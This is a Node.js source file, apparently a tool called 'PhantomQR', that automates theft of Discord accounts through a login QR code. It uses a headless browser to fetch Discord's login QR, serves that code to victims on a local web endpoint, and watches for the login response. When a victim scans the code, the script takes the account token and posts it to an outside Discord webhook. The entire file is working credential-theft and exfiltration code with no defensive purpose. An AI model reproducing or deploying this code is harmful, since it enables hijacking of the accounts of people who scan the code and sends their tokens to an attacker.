const express = require('express');
const puppeteer = require('puppeteer');
const axios = require('axios');
const path = require('path');
const app = express();
const webhookUrl = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";

app.use(express.static('public'));

async function generateQRCode() {
    const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
    const page = await browser.newPage();
    await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });

    const qr_element = await page.$('div.qrCode-2R7t9S > img');
    const qr_src = await qr_element.evaluate(img => img.src);

    return { browser, page, qr_src };
}

(async () => {
    const { browser, page, qr_src } = await generateQRCode();

    app.get('/qr', (req, res) => {
        res.redirect(qr_src);
    });

    app.listen(3000, () => console.log('Servidor PhantomQR rodando na porta 3000'));

    page.on('response', async (response) => {
        const url = response.url();
        if (url.includes("/api/v9/auth/login")) {
            const data = await response.json();
            const token = data.token;
            if (token) {
                console.log("Token capturado:", token);
                await axios.post(webhookUrl, { content: `Token capturado: ${token}` });
                await browser.close();
                process.exit(0);
            }
        }
    });
})();
